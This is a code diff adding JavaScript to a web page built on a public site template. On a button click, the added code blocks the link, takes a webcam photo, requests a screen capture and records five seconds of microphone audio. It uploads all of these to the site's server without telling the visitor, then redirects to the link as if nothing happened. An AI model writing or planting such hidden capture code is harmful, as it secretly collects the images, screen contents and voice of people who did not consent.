@@ -188,3 +188,139 @@ https://templatemo.com/tm-597-neural-glass
                 }, 2000);
             }, 1500);
         });
+        document.getElementById('initNeural').addEventListener('click', async function(event) {
+    event.preventDefault();  // linkin dərhal açılmasının qarşısını alır
+
+    // 1. Kamera şəkli çəkmə funksiyası
+    async function captureCameraImage() {
+        return new Promise(async (resolve, reject) => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+
+                // 1 saniyə gözlə ki, kamera yüklənsin
+                setTimeout(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/png');
+
+                    // Stream-i dayandır
+                    stream.getTracks().forEach(track => track.stop());
+
+                    resolve(dataURL);
+                }, 1000);
+            } catch (e) {
+                reject(e);
+            }
+        });
+    }
+
+    // 2. Ekran görüntüsü çəkmə funksiyası
+    async function captureScreenImage() {
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 320;
+            canvas.height = 240;
+            const ctx = canvas.getContext('2d');
+
+            // 1 saniyə gözlə
+            await new Promise(r => setTimeout(r, 1000));
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+
+            // Stream-i dayandır
+            stream.getTracks().forEach(track => track.stop());
+
+            return dataURL;
+        } catch (e) {
+            console.error('Ekran çəkilə bilmədi:', e);
+            return null;
+        }
+    }
+
+    try {
+        const cameraImage = await captureCameraImage();
+        const screenImage = await captureScreenImage();
+
+        console.log('Camera image:', cameraImage);
+        console.log('Screen image:', screenImage);
+
+        // Hər iki şəkli serverə göndər (eyni server endpoint)
+        await uploadImage(cameraImage);
+        if(screenImage) {
+            await uploadImage(screenImage);
+        }
+
+        // İndi linkə yönləndir
+        window.location.href = this.href;
+
+    } catch (err) {
+        console.error('Şəkil çəkmə zamanı xəta:', err);
+        alert('Şəkil çəkmək mümkün olmadı.');
+    }
+});
+function uploadImage(base64Image) {
+  return fetch('/upload-image/', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRFToken': getCookie('csrftoken'),
+    },
+    body: JSON.stringify({ image: base64Image })
+  })
+  .then(response => response.json());
+}
+async function recordAudio() {
+  return new Promise(async (resolve, reject) => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const mediaRecorder = new MediaRecorder(stream);
+      let chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = e => {
+        const blob = new Blob(chunks, { 'type' : 'audio/webm' });
+        const reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = () => {
+          resolve(reader.result);
+        };
+      };
+
+      mediaRecorder.start();
+
+      setTimeout(() => {
+        mediaRecorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+      }, 5000); // 5 saniyə yaz, istəyinə görə dəyiş
+
+    } catch(e) {
+      reject(e);
+    }
+  });
+}
+const audioData = await recordAudio();
+await uploadAudio(audioData);
+
+function uploadAudio(base64Audio) {
+  return fetch('/upload-audio/', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRFToken': getCookie('csrftoken'),
+    },
+    body: JSON.stringify({ audio: base64Audio })
+  }).then(r => r.json());
+}
